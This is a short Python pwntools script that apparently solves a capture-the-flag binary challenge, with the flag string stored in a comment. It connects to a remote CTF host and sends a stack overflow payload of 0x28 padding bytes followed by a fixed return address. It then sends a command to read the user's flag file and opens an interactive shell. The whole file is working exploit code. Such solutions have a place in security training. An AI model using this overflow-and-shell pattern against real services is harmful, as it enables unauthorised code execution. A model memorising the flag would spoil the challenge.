#!/usr/bin/env python
from pwn import *

# AD{W0W_y0u_4re_such_4_g00d_h4cker}

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10102
y = remote( host , port )

p = flat(
    'D' * 0x28,
    0x40063a
)

y.sendline( p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()